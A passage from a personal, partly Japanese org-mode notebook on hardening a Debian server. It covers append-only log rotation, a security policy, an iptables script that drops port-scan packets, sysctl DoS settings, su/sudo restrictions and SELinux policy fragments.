		ls *stats.????????.gz > /dev/null 2>&1
		stats=$?
		if [ $stats -eq 0 ] ; then
        continue
		else
        break
		fi
		done;


		ls loopstats.???????? peerstats.???????? > /dev/null 2>&1
		if [ $? -eq 0 ]; then

		# Note that gzip won't compress the file names that
		# are hard links to the live/current files, so this
		# compresses yesterday and previous, leaving the live
		# log alone.  We supress the warnings gzip issues
		# about not compressing the linked file.
		gzip --best --quiet loopstats.???????? peerstats.????????
		return=$?
		case $return in
		2)
		  exit 0			# squash all warnings
		  ;;
		  *)
		  exit $return	 	# but let real errors through
		  ;;
		  esac
		  fi
		  fi

****** cron
******* /etc/logrotate.d/rsyslog
		/var/log/cron.log
		{
		rotate 4
		monthly
		missingok
		ifempty
		compress
		dateext
		dateformat -%Y-%m
		prerotate
		/usr/bin/chattr -a /var/log/cron.log
		endscript
		postrotate
		cronnameformat="cron.log-????-??.gz"
		if [ -e /var/log/$cronnameformat ]; then
		for file in $(ls /var/log/cron-????-??.gz); do
		year=`ls $file | cut -d "-" -f 2`
		logdir=/var/log/cron/$year
		mkdir -p $logdir
		mv $file $logdir
		/usr/bin/chattr +i $logdir$cronnameformat
		if [ -e /var/log/$cronnameformat ]; then
       	continue
		else
		break
		fi
		done;
		fi

		invoke-rc.d rsyslog reload > /dev/null
		/usr/bin/chattr +a /var/log/cron.log
		endscript
		}

****** auth
******* /etc/logrotate.d/auth
		:PROPERTIES:
		:SUMMARY:  etc-logrotate.d-auth
		:END:

		/var/log/auth.log
		{
		rotate 4
		monthly
		missingok
		ifempty
		compress
		dateext
		dateformat -%Y-%m
		prerotate
		/usr/bin/chattr -a /var/log/auth.log
		endscript
		postrotate
		authnameformat="auth.log-????-??.gz"
		if [ -e /var/log/$authnameformat ]; then
		for file in $(ls /var/log/auth-????-??.gz); do
		year=`ls $file | cut -d "-" -f 2`
		logdir=/var/log/auth/$year
		mkdir -p $logdir
		mv $file $logdir
		/usr/bin/chattr +i $logdir$authnameformat
		if [ -e /var/log/$authnameformat ]; then
       	continue
		else
		break
		fi
		done;
		fi

		invoke-rc.d rsyslog reload > /dev/null
		/usr/bin/chattr +a /var/log/auth.log
		endscript
		}

****** user
******* /etc/logrotate.d/rsyslog
		/var/log/user.log
		{
		rotate 4
		yearly
		missingok
		ifempty
		compress
		dateext
		dateformat -%Y
		prerotate
		/usr/bin/chattr -a /var/log/user.log
		endscript
		postrotate
		usernameformat="user.log-????.gz"
		if [ -e /var/log/$usernameformat ]; then
		for file in $(ls /var/log/$usernameformat); do
		logdir=/var/log/user/
		mkdir -p $logdir
		mv $file $logdir
		/usr/bin/chattr +i $logdir$usernameformat
		if [ -e /var/log/$usernameformat ]; then
       	continue
		else
		break
		fi
		done;
		fi

		invoke-rc.d rsyslog reload > /dev/null
		/usr/bin/chattr +a /var/log/user.log
		endscript
		}

****** sulog
******* /etc/login.defs
# mv sulog sulog.tmp
# mkdir  sulog
# mv sulog.tmp sulog/sulog
# nano /etc/login.defs
		SULOG_FILE	/var/log/sulog/sulog
****** apt
	   - # rm /etc/logrotate.d/apt
	   - # chattr +a /var/log/apt/term.log /var/log/apt/history.log
****** aptitude
	   - # rm /etc/logrotate.d/aptitude
	   - # chattr +a /var/log/aptitude
****** dpkg
	   - # rm /etc/logrotate.d/dpkg
	   - # chattr +a /var/log/dpkg.log
****** exim4
****** kern
****** daemon
****** boot
****** dmesg
****** faillog
****** debug
****** message
****** unattended-upgrades
****** pycentral.log
****** lpr
****** installer
****** fsck
****** wtmp
****** btmp
******* /etc/login.defs
# mv /var/log/btmp /var/log/btmp.tmp
# mkdir /var/log/btmp
# mv /var/log/btmp.tmp /var/log/btmp/btmp
# nano /etc/login.defs
		FTMP_FILE    /var/log/btmp

***** boot 時のログを全て記録
      :PROPERTIES:
      :SUMMARY:  etc-default-bootlogd
      :END:

	  - # nano /etc/default/bootlogd
		BOOTLOGD_ENABLE=YES

***** logwatch
***** syslog-summary
      :PROPERTIES:
      :SUMMARY:  syslog-summary1
      :END:

	  /var/log/syslog
	  {
	  rotate 7
	  daily
	  missingok
	  delaycompress
	  compress
	  dateext
	  dateformat -%Y-%m-%d
	  prerotate
	  /usr/bin/chattr -a /var/log/syslog
	  endscript
	  postrotate
	  if [ -e /var/log/syslog-????-??-??.gz ]; then
	  for file in $(ls /var/log/syslog-????-??-??.gz); do
	  year=`ls $file | cut -d "-" -f 2`
	  month=`ls $file | cut -d "-" -f 3`
	  logdir=/var/log/rsyslog/$year/$month
	  mkdir -p $logdir
	  mv $file $logdir
	  /usr/bin/chattr +i $logdir$file
	  if [ -e /var/log/syslog-????-??-??.gz ]; then
      continue
	  else
	  break
	  fi
	  done;
	  fi

	  invoke-rc.d rsyslog reload > /dev/null
	  /usr/bin/chattr +a /var/log/syslog
	  endscript

	  }

	  /var/log/mail.info
	  /var/log/mail.warn
	  /var/log/mail.err
	  /var/log/mail.log
	  /var/log/daemon.log
	  /var/log/kern.log
	  /var/log/lpr.log
	  /var/log/debug
	  /var/log/messages
	  {
	  rotate 4
	  weekly
	  missingok
	  notifempty
	  compress
	  delaycompress
	  sharedscripts
	  postrotate
	  invoke-rc.d rsyslog reload > /dev/null
	  endscript
	  }

	  /var/log/cron.log
	  {
	  rotate 4
	  monthly
	  missingok
	  ifempty
	  compress
	  dateext
	  dateformat -%Y-%m
	  prerotate
	  /usr/bin/chattr -a /var/log/cron.log
	  endscript
	  postrotate
	  if [ -e /var/log/cron.log-????-??.gz ]; then
	  for file in $(ls /var/log/cron-????-??.gz); do
	  year=`ls $file | cut -d "-" -f 2`
	  logdir=/var/log/cron/$year
	  mkdir -p $logdir
	  mv $file $logdir
	  /usr/bin/chattr +i $logdir$file
	  if [ -e /var/log/cron.log-????-??.gz ]; then
      continue
	  else
	  break
	  fi
	  done;
	  fi

	  invoke-rc.d rsyslog reload > /dev/null
	  /usr/bin/chattr +a /var/log/cron.log
	  endscript
	  }

	  /var/log/user.log
	  {
	  rotate 4
	  yearly
	  missingok
	  ifempty
	  compress
	  dateext
	  dateformat -%Y
	  prerotate
	  /usr/bin/chattr -a /var/log/user.log
	  endscript
	  postrotate
	  if [ -e /var/log/user.log-????.gz ]; then
	  for file in $(ls /var/log/user.log-????.gz); do
	  logdir=/var/log/user/
	  mkdir -p $logdir
	  mv $file $logdir
	  /usr/bin/chattr +i $logdir$file
	  if [ -e /var/log/user.log-????.gz ]; then
      continue
	  else
	  break
	  fi
	  done;
	  fi

	  invoke-rc.d rsyslog reload > /dev/null
	  /usr/bin/chattr +a /var/log/user.log
	  endscript
	  }

***** swatch
***** lire
**** remove File & Directory
	 :PROPERTIES:
	 :SUMMARY:  remove-file-directory
	 :END:

	 - # rm -rf /usr/games /usr/local/games
***** remove login message
      :PROPERTIES:
      :SUMMARY:  remove-login-message
      :END:

	  - rm /etc/motd.tail
	  - nano /etc/motd

**** 管理用ユーザー設定
	 :PROPERTIES:
	 :SUMMARY:  add_group
	 :END:

	 - # nano /etc/group
	   adm:x:4:root,t1
	   fuse:x:106:t1    # for sshfs
	   # nano /etc/pam.d/su
	   auth required pam_wheel.so group=adm

**** apt のダウンロード幅を制限 (保留)
	 - # nano /etc/apt/apt.conf
	   APT::Acquire::http::Dl-Limit "
*** Security
**** Policy
   	 :PROPERTIES:
   	 :SUMMARY:  security_policy1
   	 :END:
***** そもそも本当にセキュリティが必要か?
***** なぜセキュリティが必要か?
	  インターネットにサーバーを公開すると次のような脅威にさらされる為である。
****** 侵入
	   攻撃者の多くはネットワークを経由して侵入を試みる。
	   攻撃者の大半は、無差別にターゲットを選び、セキュリティーホールなどの不具合を狙う。
	   サーバーをインターネットに公開直後から不正アクセスログが記録され続けることからも明らか。

******* 情報漏洩
		攻撃者により、サーバーに保存されている機密情報を入手 (参照) されてしまう。
		侵入者が入手を試みる情報には、サーバーが保持するアカウント/ パスワード情報や電子商取引などで使用している顧客情報などがある。
		また、盗聴ツールを仕掛けられことによる情報漏洩の可能性もある。この被害は、機密性の侵害にあたる。

******* 改竄、消去
		侵入者が、故意にファイルやデータを変更したり削除したりする行為である。
		改ざんの対象としては、 Web ページやログファイル、パスワードファイル、設定ファイルなどがあげられる。
		また、システム動作に関連するファイルを削除するような、システムの破壊的な行為が行われる場合もある。
		この被害は、インテグリティ、可用性、説明可能性の侵害にあたる。

******* バックドア作成
		バックドアとは、主に侵入者が侵入したサーバーへ再び侵入するために、サーバー管理者に見つからないように仕掛けた裏口のことである。
		バックドアには、特定ポートでシェルを起動させたり、バックドアプログラムを仕掛けたり、パスワードなしでログインできるユーザを追加するなどがある。
		この被害は、機密性の侵害にあたる。

******* 踏み台
		踏み台とは、攻撃者がサーバーを攻撃する際に、攻撃拠点として利用するサーバー (既に攻撃者によって侵入されているサーバー) を指す。
		その結果、被害者は実際の攻撃者から攻撃を受けるのではなく、踏み台となったサーバーから攻撃されたことになり、踏み台となったサーバーは、加害者となってしまうことがある。
		これらにより相手に大きな被害を与えてしまった場合、攻撃側となった者が莫大な損害賠償を請求される可能性もある。
		第三者サーバーへの攻撃が不正アクセス者による者である確実な証拠を提示できなければ責任を問われることになる。
		又、この被害は、機密性の侵害にもあたる。
		個人のサーバーの場合、情報資産 よりも踏み台やスパムの拠点として狙われる可能性が大きいと思われる。

****** サービス使用妨害
	   サービス妨害 (DoS : Denial of Service) 攻撃とは、攻撃のターゲットとなるサーバーやネットワークの提供するサービスを妨害する行為である。
	   DoS 攻撃によって、発生する被害 (脅威) には以下のようなものがある。

	   - OS 、サービスのダウン
		 DoS 攻撃のターゲットとなった OS またはサービスが、攻撃によりダウンしてしまう。
		 そのため、意図的に OS やサービスを再起動しなければ、正常サービスの提供が開始できない。
		 この被害は、ソフトウェアのバグを悪用した DoS 攻撃により発生する場合が多い。
		 この被害は、可用性の侵害にあたる。

	   - 一時的なサービスの停止
		 DoS 攻撃を受けている間、正常サービスの提供が妨害されてしまうが、攻撃終了後、正常なサービス提供が復旧する。
		 主に、この被害は、過負荷を与える DoS 攻撃により生じるもので、多量のパケットを利用した DoS 攻撃の場合、パケット数が一定値以下に削減されることで、正常なサービスが提供できる状態に戻る。この被害は、可用性の侵害にあたる。

****** 盗聴
	   盗聴とは、ターゲットとなるサーバーまたはネットワークの情報を盗み取るものである。
	   盗聴により入手した情報を基に、侵入攻撃など行うことが可能になる。
	   この盗聴により、発生する被害 (脅威) には以下のようなものがある。

****** 情報漏洩
	   攻撃者により、サーバーに保存されている機密情報を入手 (参照) されてしまう。
	   侵入者が入手を試みる情報には、サーバーが保持するアカウント/ パスワード情報や電子商取引などで使用している顧客情報などがある。
	   また、盗聴ツールを仕掛けられたことによる情報漏洩の可能性もある。
	   この被害は、機密性の侵害にあたる。

****** 参照
	   (cf. 2011 年 7 月 30 日 [[http://www.ipa.go.jp/security/awareness/administrator/secure-web/chap3/3_require-3.html][IPA セキュアな Web サーバーの構築と運用 3.2.3 セキュリティ脅威の洗い出しと評価]])

***** なぜセキュリティポリシーが必要か?
	  - セキュリティの目標、基準を明確にし、よい意志決定をしセキュリティを強固で抜け目のないものにするため。
	  - セキュリティの一貫性の維持
		これらがが明確でないと時間とともにセキュリティツール間に、一貫性がなくなる。
		また、数あるセキュリティツールを使いこなすことも容易でなくなる。
		明確でないこということは、何をチェック、制約すべきかが曖昧になる。

		一貫性のないセキュリティはセキュリティホールを開ける要因となる。
		セキュリティに一貫性がなく機能の導入や削除を繰り返していると人為的ミスによってセキュリティホールを開けてしまうことになる。

		(cf. RFC2196)

***** 目標
	  - 学習も兼ねて、オープンソースで機能を積極的に導入し、サーバーのセキュリティを強固で抜け目のないものにする。

	  - スパムメールの拠点、 Dos アタック、踏み台等になることは断固さける。

	  - 法令、判例を理解し遵守。

***** 基準
****** リスク
	   - 個人のサーバーの為、情報資源よりも踏み台、スパムの拠点として狙われる可能性が高い。
		 踏み台や、スパムの拠点となってしまった場合、不正アクセスの容疑者などとして
		 サーバー等を押収される恐れがある。

****** どのような攻撃から何を守るのか
# セキュリティ対策を実施するには、どのような攻撃から何を守るのかを明確にすることが肝要。
	   攻撃:
	   - Dos 攻撃、侵入、ウイルス

		 守るべき物:
	   - サーバの権限

****** 利便性とセキュリティのバランス
	   - セキュリティと利便性はトレードオフである。
		 個人のサーバーにおいてはセキュリティよりも、利便性を優先してしまいがちだが基本的にセキュリティを優先する。
		 個々のサービスは、それぞれ固有のセキュリティリスクを持っている。
		 サービスによっては便益よりリスクの方が大きい場合がある。
		 このような場合、サービスの停止を考慮すべきである。

****** 操作性とセキュリティのバランス
	   - 常識的範囲内で操作性よりもセキュリティを優先する。
	   - どんなユーザにもアクセスを許容し、パスワードを要求しないシステムはよい操作性といえる。
		 すなわち、セキュリティのないものといえる。
		 パスワードを要求することによって、操作性は失われるがセキュリティの高いものといえる。
****** コストとセキュリティのバランス
	   - ソフト面はオープンソースで実装。
		 ハード面は個人ができうる限りの実装を試みる。

****** 定期的に直し
	   - 定期的見直し
		 IT の発展速度は極めて速いため、ある時に構築したセキュリティが、
		 永続的にセキュリティを担保できることはない。
		 セキュリティは継続的取り組みによって保てるものであると認識しなければならない。
		 将来の技術、脅威の動向等を踏まえ評価見直しを行う。
		 policy の見直し> 設計の見直し > 反映 > 運用 > 監査
		 (cf. 2011 年 7 月 29 日 [[http://www.kantei.go.jp/jp/it/security/taisaku/guideline.html][情報セキュリティポリシーに関するガイドライン- II.基本的な考え方 - 1. 意義 - (2) 情報セキュリティの特性]])
		 定期的に pentest  し必要があれば更新を行う 一年
		 システムを更新したら pentest
		 踏み台やスパムの拠点となってしまった場合、長期に渡ってサーバーに異変が及ぶことがほとんどである。
		 よって、定期的点検が重要である。

	   - セキュリティ用件の見直し
		 [[http://www.ipa.go.jp/security/fy18/development/localgov/][情報処理推進機構：情報セキュリティ：セキュリティ要件検討支援ツール]]

****** 利用者
	   - もちろん自分 1 人のみ
	   - 例外的に友人、知人などにファイルの受け渡し等の環境整備も考慮

****** password
	   password 心得
	   -①パスワードを秘密にしておくこと。
	   -②パスワードのメモは作らないこと。ただし、メモが安全に保管される場合はその限りではない。
	   -③情報システム又はパスワードに対する危険のおそれがある場合は、パスワードを変更すること。
	   -④適切な長さを持つパスワードを選択すること。その文字列については、想定しにくいものにしなければならない（詳細は実施手順で定める。）。
	   -⑤パスワードは定期的に、若しくはアクセス回数に基づいて変更し、古いパスワードの再利用をしてはならない。管理者用パスワードはさらにこのサイクルを頻繁にすること。
	   -⑥利用者のパスワードは他人に使用させないこと。
	   -⑦モバイル機器にパスワードを記憶させてはならない。
	   (cf. 2011 年 7 月 30 日 [[http://www.kantei.go.jp/jp/it/security/taisaku/guideline.html][情報セキュリティポリシーに関するガイドライン - III.ポリシーのガイドライン - (5) 対策基準の策定 - (iv) 人的セキュリティ - (d) パスワードの管理]])
******* スーパーコンピューター処理速度
		- スパコン京、 2011 年 7 月 25 日現在の計算速度    (cf.[[http://www.top500.org/list/2011/06/100][TOP500]])
		  1 秒         =         816200000000000         (8162 兆) 10**15
		  1 分         =       48972000000000000     (48 京 9720 兆) 10**17
		  1 時間       =     2938320000000000000   (2938 京 3200 兆) 10**19
		  1 日         =    70519680000000000000 (7 垓 519 京 6800 兆) 10**20
		  一ヶ月 (30 日)= 21155904000000000000000   (2115 垓 5904 京) 10**23

******* パスワード組み合わせ
		abcdefghijklmnopqrstuvwxyz     26 文字
		ABCDEFGHIJKLMNOPQRSTUVWXYZ     26 文字
		0123456789                     10 文字
		~@#$%^&*()_+-=[]{},.\"/?:;`    27 文字
		SPACE                          1 文字
        合計   90 文字
		パスワード 90 文字の文字数 18 文字で
		150094635296999121000000000000000000 通り (15 澗 94 溝 6352 穣 9699 口 9121 垓) 10**37
		上記のスパコンで 7094692587799 ヶ月かかる。

****** security 階層別基準
******* 1. 抑止 & 狙わせない
		- 抑止力: 活動をやめさせる力。思いとどまらせる力。
		  行為の達成が困難、または代償が高くつくことを予見させ、その行為を思いとどまらせる力。
		  まず、標的にならないことが重要。

******* 2. セキュリティホールをつくらない
		- 定期的にアップデート、環境を常に最新の状態にする。

		- 情報収集体制の構築
		  情報セキュリティに関するニュース、情報に気を配る。
		  情報を分析し、最新の動向を把握する。

		- システムをコンパクトでシンプルに保つ
		  一般的な原則として複雑なシステムは管理に高度な知識が要求され、繁雑になりやすく脆弱性を抱える要因となる。
		  システムは最小構成にする。

******* 3. network level
		- ファイアーウォールを強固にする。

******* 4. 検知
******* 5. application level
******** ウイルス対策
		 - アンチウィルスソフトは導入しない。
		   パーミッション管理、 selinux に重点を置く。

******** 最小権限の原則 principle of least privilege
******* 6. 最終防衛ライン
******* 7. 緊急時の対策
		trace 環境構築
		届け出
		[[http://www.ipa.go.jp/security/tode/][情報処理推進機構：情報セキュリティ：届出について]]

**** Prerequisites
***** Law 管理者側の義務
# 不正アクセス者を処罰してもらうためには、被害者側のコンピューターに
# アクセス制御機能が備わっていることが前提条件となる。
	  (cf. 2011 年 7 月 26 日 [[file:~/Doc/law.org::アクセス管理者による防御措置][不正アクセス行為禁止等に関する法律-第五条]])
	  (cf. 2011 年 7 月 26 日 [[http://itpro.nikkeibp.co.jp/article/COLUMN/20090605/331438/][第 27 回　不正アクセス禁止法　アクセス制御機能は管理者側の義務]])
# pdf 配置すること (保存済み)

***** Infomation Gathering
	  - [[http://www.mod.go.jp/j/publication/wp/index.html][防衛省・自衛隊：防衛白書 サイバー攻撃について]]

**** Physical
	 - [ ] マシーンルームへ立ち入らせない。
	 - [ ] [[鍵付きケース][ケースに鍵を掛ける]] BIOS 初期化対策 hdd アクセス禁止
	 - [ ] BIOS で chassis intrusion を設定しケースの開閉を監視

**** Stealth
**** Network
***** Iptable
	  - 拒否リスト作成
		国別ファイアーウォール
		特に ssh は厳密に遮断。
# ポートの指定は番号で指定する。
# 読みにくくなるがサービス名をチェックする必要がなくなる為多少速くなる。
# (cf. 2011 年 7 月 15 日 [[http://www.asahi-net.or.jp/~aa4t-nngk/ipttut/output/implicitmatches.html][Iptables チュートリアル 1.2.2 Chapter 10.iptables のマッチ 10.2.1. TCP マッチ]])

****** iptables-up
       :PROPERTIES:
       :SUMMARY:  iptables-up1
       :END:

#!/bin/sh


## Valiables
#
SERVER_IP="192.168.1.123"

# /etc/network/if-up.d/iptables-up

PATH=/sbin:/bin:/usr/sbin:/usr/bin

## Enable TCP SYN cookie protection from SYN floods.
#
echo 1 > /proc/sys/net/ipv4/tcp_syncookies

## Disable ICMP redirect acceptance.
#
#echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects

## Enable bad error message protection
#
#echo 1 > /proc/sys/net/ipv4/icmp_ignore_bogus_error_responses

## Log spoofed packets, source routed packets, redirect packets
#
echo 1 > /proc/sys/net/ipv4/conf/all/log_martians

## Disable response to broadcasts.
#
#echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts

### Initialize
##
#
/sbin/iptables -F INPUT
/sbin/iptables -F OUTPUT
/sbin/iptables -F FORWARD
/sbin/iptables -X         # Delete user-define chain
/sbin/iptables -Z         # Zero the packet and byte counters in all chains.

## basic
#
/sbin/iptables -P INPUT DROP
/sbin/iptables -P OUTPUT ACCEPT
/sbin/iptables -P FORWARD DROP

### INPUT
## Allow all INPUT from localhost
#
/sbin/iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -i lo -j ACCEPT -m comment --comment "Allow all INPUT from localhost"

## ssh
#
/sbin/iptables -A INPUT -p tcp --dport 12316 -j ACCEPT -m comment --comment "Allow INPUT ssh port 12316"

## Squid proxy
#
/sbin/iptables -A INPUT -s 192.168.1.0/24 -p tcp --destination-port 8080 -m state --state NEW -j ACCEPT

## Samba
#
/sbin/iptables -A INPUT -p udp -m udp -s 192.168.1.0/24 --dport 137 -j ACCEPT
/sbin/iptables -A INPUT -p udp -m udp -s 192.168.1.0/24 --dport 138 -j ACCEPT
/sbin/iptables -A INPUT -m state --state NEW -m tcp -p tcp -s 192.168.1.0/24 --dport 139 -j ACCEPT
/sbin/iptables -A INPUT -m state --state NEW -m tcp -p tcp -s 192.168.1.0/24 --dport 445 -j ACCEPT

## king service
#
/sbin/iptables -A INPUT -p udp -m udp -s 192.168.1.0/24 --dport 65535 -j ACCEPT


### Allows all established connections
#
/sbin/iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT -m comment --comment "Allows all established connections"

### Logging
#
/sbin/iptables -A INPUT -j ULOG --ulog-prefix "IPTABLES DROP:"


## Block Nmap
#
echo 1 > /proc/sys/net/ipv4/ip_forward

/sbin/iptables -t filter -A INPUT -p TCP -m state --state RELATED,ESTABLISHED -j ACCEPT
/sbin/iptables -t filter -A INPUT -p UDP -m state --state RELATED,ESTABLISHED -j ACCEPT
/sbin/iptables -t filter -A INPUT -p ICMP --icmp-type 8 -s 192.168.1.1/24 -d $SERVER_IP -m state --state NEW,RELATED,ESTABLISHED -j ACCEPT
/sbin/iptables -t filter -A INPUT -m state --state INVALID -j DROP

/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ACK,FIN FIN -j LOG --log-prefix "FIN: "
/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ACK,FIN FIN -j DROP

/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ACK,PSH PSH -j LOG --log-prefix "PSH: "
/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ACK,PSH PSH -j DROP

/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ACK,URG URG -j LOG --log-prefix "URG: "
/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ACK,URG URG -j DROP

/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ALL ALL -j LOG --log-prefix "XMAS scan: "
/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ALL ALL -j DROP

/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ALL NONE -j LOG --log-prefix "NULL scan: "
/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ALL NONE -j DROP

/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j LOG --log-prefix "pscan: "
/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP

/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags SYN,FIN SYN,FIN -j LOG --log-prefix "pscan 2: "
/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP

/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags FIN,RST FIN,RST -j LOG --log-prefix "pscan 2: "
/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags FIN,RST FIN,RST -j DROP

/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ALL SYN,FIN -j LOG --log-prefix "SYNFIN-SCAN: "
/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ALL SYN,FIN -j DROP

/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ALL URG,PSH,FIN -j LOG --log-prefix "NMAP-XMAS-SCAN: "
/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ALL URG,PSH,FIN -j DROP

/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ALL FIN -j LOG --log-prefix "FIN-SCAN: "
/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ALL FIN -j DROP

/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ALL URG,PSH,SYN,FIN -j LOG --log-prefix "NMAP-ID: "
/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags ALL URG,PSH,SYN,FIN -j DROP

/sbin/iptables -t filter -A INPUT   -p tcp --tcp-flags SYN,RST SYN,RST -j LOG --log-prefix "SYN-RST: "


###### test
##
## SYN-Flooding Protection
#
#iptables -N syn-flood
#iptables -A INPUT -i eth0 -p tcp --syn -j syn-flood
#iptables -A syn-flood -m limit --limit 1/s --limit-burst 4 -j RETURN
#iptables -A syn-flood -j DROP
#
### Make sure that new TCP connections are SYN packets
##
#iptables -A INPUT -i eth0 -p tcp ! --syn -m state --state NEW -j DROP


****** [[etc/ulog.conf][iptables.log]]
***** snort
***** /etc/hosts.deny /etc/hosts.allow
***** denyhosts
***** /etc/at.deny
***** (temp) sysctl
      :PROPERTIES:
      :SUMMARY:  sysctl1
      :END:

****** icmp echo ignore
	   - # nano /etc/sysctl.d/icmp_echo_ignore.conf
		 net/ipv4/icmp_echo_ignore_all = 1

		 [[http://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html][Securing Debian Manual - After installation - 4.17.1 Configuring network features]]

****** Smurf 攻撃対策
# Smurf 攻撃とは 、ターゲットにしたホストに対して、
# 送信元アドレスを偽造した ICMP Echo Request パケットを
# 大量に送り付ける攻撃方法です。
# ICMP Echo Request パケットを特定のホストではなく、
# ブロードキャストアドレスに対して送信した場合、
# そのネットワーク上のすべてのコンピュータから応答パケットが投げ返されます。
# 1 = 有効 (Dos 対策) 2 = 無効

# 確認
	   - # cat /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts

# 反映
	   - # echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
		 or# sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1

# 起動時に反映
	   - # nano /etc/sysctl.conf
# Disable Broadcast Ping
		 net.ipv4.icmp_echo_ignore_broadcasts=1  #追加

		 or# nano /etc/network/if-up.d/iptables-up
		 # Disable Broadcast Ping
		 echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts

		 (cf. 2011 年 7 月 16 日 [[http://www.atmarkit.co.jp/flinux/rensai/iptables03/iptables03d.html][＠ IT ： iptables による負荷分散と DoS 対策（ 4/4 ）]])

****** Dos 対策
******** SYN cookie protection from SYN floods
# ACK の確認応答番号を計算し正当なセッションを確認する。
# この計算の為、多少 CPU の処理能力が必要となる。
# 1 = 有効 (Dos 対策) 2 = 無効

# 確認
		 - # cat /proc/sys/net/ipv4/tcp_syncookies

# 反映
		 - # echo 1 > /proc/sys/net/ipv4/tcp_syncookies
		   or# sysctl -w net.ipv4.tcp_syscookies=1

# 上記の方法では再起動すると設定は消える。

# 起動時に反映
		 - # nano /etc/sysctl.conf
# Enable TCP SYN cookie protection from SYN floods. # 追加
		   net.ipv4.tcp_syncookies=1       # 追加

		   or# nano /etc/network/if-up.d/iptables-up
		   # Enable TCP SYN cookie protection from SYN floods.
		   echo 1 > /proc/sys/net/ipv4/tcp_syncookies

		   (cf. 2011 年 7 月 16 日 [[http://www.atmarkit.co.jp/flinux/rensai/iptables03/iptables03d.html][＠ IT ： iptables による負荷分散と DoS 対策（ 4/4 ）]])

**** Host
***** 不要なものはインストールしない (tmp)
	  - 最小構成で OS をインストール
	  - # dpkg --list
	  - [[etc-apt-apt.conf][recommends をインストールしない]]

***** 不要なサービスの停止
	  - # netstat -an
***** BIOS
	  - [ ] Disable CD/FDD/USB boot
	  - [ ] Set Password

***** GRUB Password
	  - [ ] [[GRUB password][Set GRUB sigle user password]]

***** su
****** su コマンドの実行ユーザー制限
       :PROPERTIES:
       :SUMMARY:  su1
       :END:
# group によって実行可能ユーザーを振り分ける
# debian は wheel グループは存在していない。
# 代わりに adm グループを使用する。
	   (cf. [[http://oss.org.cn/man/linux/debian/reference/ch-tune.ja.html#s-wheel][Debian リファレンス - Debian システムのチューニング - なぜ GNU su は wheel グループをサポートしていないのか]] )

	   - # usermod -G adm t1
		 # nano /etc/pam.d/su
# (Replaces the `SU_WHEEL_ONLY' option from login.defs)
# auth       required   pam_wheel.so
		 auth       required   pam_wheel.so group=adm

		 - #check
		   $ su
		   Password:
		   su: Permission denied
****** sudo ユーザー制限
       :PROPERTIES:
       :SUMMARY:  visudo1
       :END:

	   - # visudo
# 最後に追加
		 t1      ALL=(ALL) ALL
         t1 ALL=NOPASSWD: /usr/bin/ssh,/usr/bin/rsync,/sbin/shutdown,/sbin/halt,/sbin/reboot,/bin/mount
***** Security Update
      :PROPERTIES:
      :SUMMARY:  security-upgrades1
      :END:
	  - unattended-upgrades で自動アップデート
		# [[apt-get_install][apt-get install unattended-upgrades]]
		# nano /etc/apt/apt.conf.d/50unattended-upgrades
		APT::Periodic::Update-Package-Lists "1";
		APT::Periodic::Download-Upgradeable-Packages "1";
		APT::Periodic::Unattended-Upgrade "1";

***** Selinux
      :PROPERTIES:
      :SUMMARY:  selinux1
      :END:
****** mailing list
	   nasa http://nasa.gov/selinux/info/list.cfm?MenuID=41.1.1.9
	   red hat fedra http://redhat.com/mailman/listinfo/fedora-selinux-list
	   Gentoo http://www.gentoo.org/proj/en/hardened/

****** [[file:~/mydoc/linux/selinux/selinux][install_selinux]]
****** ssh port
# 確認
	   - # semanage port -l |grep ssh

# 追加
	   - # semanage port -a -t ssh_port_t -p tcp 12316

****** /etc/selinux/default/contexts/files/file_contexts
	   - # semanage fcontext -a -t var_log_t "/var/log/iptables (/.*)?"
	   - # restorecon -R /var/log/iptables
****** mylocal.te
	   module mylocal 1.3;
	   require {
	   type ifconfig_t;
	   type kernel_t;
	   type tty_device_t;
	   type mount_t;
	   type fsadm_t;
	   type iptables_t;
	   type tmpfs_t;
	   type modules_dep_t;
	   type lvm_t;
	   type hostname_t;
	   type ulogd_t;
	   type var_log_t;
	   class filesystem getattr;
	   class file { read open getattr };
	   class chr_file { read write };
	   class system module_request;
	   class dir {ioctl read write getattr lock append add_name remove_name search open };
	   class file {ioctl read write create getattr setattr lock append unlink link rename open};
	   }

#============= fsadm_t ==============
	   allow fsadm_t tty_device_t:chr_file { read write };

#============= hostname_t ==============
	   allow hostname_t tty_device_t:chr_file { read write };

#============= ifconfig_t ==============
	   allow ifconfig_t tty_device_t:chr_file { read write };

#============= iptables_t ==============
	   allow iptables_t tty_device_t:chr_file { read write };

#============= lvm_t ==============
